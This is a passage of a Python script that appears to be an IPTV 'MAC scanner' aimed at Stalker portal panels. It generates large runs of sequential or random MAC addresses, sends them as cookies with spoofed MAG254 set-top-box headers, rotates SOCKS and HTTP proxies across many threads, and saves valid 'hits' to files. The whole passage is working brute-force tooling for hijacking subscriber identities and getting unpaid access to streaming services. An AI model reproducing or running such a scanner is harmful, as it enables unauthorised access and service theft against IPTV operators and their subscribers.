		dir=rootDir+'/proxy/'
	if not os.path.exists(dir):
	    os.mkdir(dir)
	for files in os.listdir (dir):
	 	say=say+1
	 	dsy=dsy+"\033[1;91m╠☞ \33[0m\033[36m"+str(say)+" \33[0m\033[0;94m"+files+'\33[0m\n'
	print ("""SCEGLI UNA COMBO!!
╔════════════════════	
"""+dsy+"""╚════════════════════
\33[33m COMBO TROVATE""" +str(say)+""" DALLA LISTA! """)
	dsyno=str(input("\33[31m"+mesaj+"\nCOMBO = \33[0m"))
	say=0
	for files in os.listdir (dir):
		 say=say+1
		 if dsyno==str(say):
		 	dosya=(dir+files)
		 	break
	say=0
	try:
		 if not dosya=="":
		 	print(dosya)
		 else:
		 		temizle()
		 		print("\033[0;96mSélection de combo Invalid..!")
		 		quit()
	except:
		if comboc=="":
			if dsyno=="0" or dsyno=="":
				temizle()
				nnesil=str(yeninesil)
				nnesil=(nnesil.count(',')+1)
				for xd in range(0,(nnesil)):
		 			tire=' 》'
		 			if int(xd) <9:
		 				tire='  》'
		 			print(str(xd+1)+tire+yeninesil[xd])
				mactur=input("\033[0;96mChoisir le type de Mac!\n\nRéponse =\033[0;94m ")
				if mactur=="":
		 			mactur=1
				randomturu=input("""\033[0;91mgénérer Mac!

 \33[33mMac en cascade = \33[31m1
 \33[33mMac aléatoire = \33[31m2

\33[0m\33[1m Type de Mac =\33[31m """)
				if randomturu=="":
		 			randomturu="2"
				serim=""
				serim=input(""" \033[0;94m
\33[33mUtilisé Mac serial?\n
 \33[1m\33[34mOui (1) \33[0m ou \33[1m\33[32mNon (2) \33[0m

Réponse = """)
				mactur=yeninesil[int(mactur)-1]
				if serim =="1":
		 			seri=input("Échantillon="+mactur+"\33[31m5\33[0m\nÉchantillon="+mactur+"\33[31mFa\33[32m\nÉcrivez une ou deux valeurs!!!\33[0m\n\33[1m"+mactur+"\33[31m")
				combouz=input("""\33[0m
		 		
Macs a scanner

Nombres de Mac=""")
				if combouz=="":
		 			combouz=3000000
				combouz=int(combouz)
				randommu="xdeep"
		else:
			
			temizle()
			print("\33[1;37;44mSélection de fichier de combinaison incorrecte...!")
			quit()
	if comboc=="":
		if randommu=="":
			combodosya=dosya.replace(rootDir+'combo',"")
			combodosya=combodosya.replace('.txt',"")
			comboc=open(dosya, 'r', encoding='utf-8')
			combototLen=comboc.readlines()
			combouz=(len(combototLen))
		    
		else:
			comboc='PRL'
	        
	else:
		#if not comboc=='PRL':
			proxydosya=dosya
			proxyc=open(dosya, 'r', encoding='utf-8')
			proxytotLen=proxyc.readlines()
			proxyuz=(len(proxytotLen))
			statusproxy = ("""
 ╠   \33[36m"""+str(proxydosya)+"""\33[0m 
 ╠   \33[1;32m"""+str(proxyuz)+"""\33[0m   """)


randommu=""
dosyasec()
proxi=input("""\033[0;94m
UTILIZZARE I PROXY ??

 1 - SI
 2 - NO

 Réponse 1 ~ 2 = \033[0;91m """)

#print(PRL) 
if proxi =="1":  	
	print(statusproxy)
	dosyasec()
	pro=input("""\033[0;91m
Seleziona il tipo di Proxy?
	
	1 - ipVanish
	2 - Socks4 
	3 - Socks5
	4 - Http/Https

Tipo di Proxy =""")
print(proxyuz)		
botgir=input("""\033[0;94m
Numero di Bots?

 Bots =""")
if botgir=="":
	botgir=1

proxysay=0

import re
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


k=0
jj=0
iii=0
genmacs=""
bib=0
import random
def randommac():
	global genmacs,combosay
	combosay=combosay+1
	global k,jj,iii
	if randomturu == '2':
		while True:
			genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
			if not genmac in genmacs:
				genmacs=genmacs + ' '
				break
	else:
		if iii >= 257:
			iii=0
			jj=jj+1
		if jj >= 257:
			if not len(seri)==2:
				jj=0
			k=k+1
			if len(seri)==2:
				quit()
		if k==257:
			quit()
		genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
		iii=iii+1
	if serim=="1":
	   if len(seri) ==1:
	   	genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
	   if len(seri)==2:
	   	genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
	genmac=genmac.replace(':100',':10')
	genmac=genmac.upper()
	return genmac

import sys

def hea1(panel,mac):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
		}
		
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
			}

	return data
	
def hea2(mac,token):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
	}
	
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
			}
		
	return data

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

from datetime import date
def tarih_clear(trh):
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	d = date(int(yil), int(ay), int(gun))
	sontrh = time.mktime(d.timetuple())
	out=(int((sontrh-time.time())/86400))
	return out
	
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses=requests.Session() 

Dosyab=hits+"𝐅𝐔𝐋𝐋★𝐇𝐈𝐓𝐒/ULTIMAX{"+panel.replace(":","_").replace('/','')+"}#"+str(nickn)+"{𝐅𝐔𝐋𝐋}.txt"

Dosyac=hits+"𝐌𝐀𝐂★𝐇𝐈𝐓𝐒/ULTIMAX{"+panel.replace(":","_").replace('/','')+"}#"+str(nickn)+"{𝐌𝐀𝐂}.txt"

DosyaA=hits+"𝐌𝐈𝐍𝐈★𝐇𝐈𝐓𝐒/ULTIMAX{"+panel.replace(":","_").replace('/','')+"}#"+str(nickn)+"{𝐌𝐈𝐍𝐈}.txt"


combosay=0

combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti



def proxygetir():
	if proxi =="1":
		global proxysay,bib
		bib=bib+1
		bekle(bib,"xdeep")
		if bib==15:
			bib=0
		while True:
			try:
				proxysay=proxysay+1
				if proxysay==proxyuz:
					proxysay=0
				
				proxygeti=(proxytotLen[proxysay])
				pveri=proxygeti.replace('\n','')
				
				pip=pveri.split(':')[0]
				pport=pveri.split(':')[1]
				
				if pro=="1":
					pname=pveri.split(':')[2]
					ppass=pveri.split(':')[3]
					proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
				if pro=="2":
					proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
				if pro=="3":
					proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
				if pro=="4":
					proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
				break
			except:pass
	else:
		proxies=""
	return proxies


import threading
for xdeep in range(int(botgir)):
	XDeep = threading.Thread(target=XD)
	XDeep.start()						
     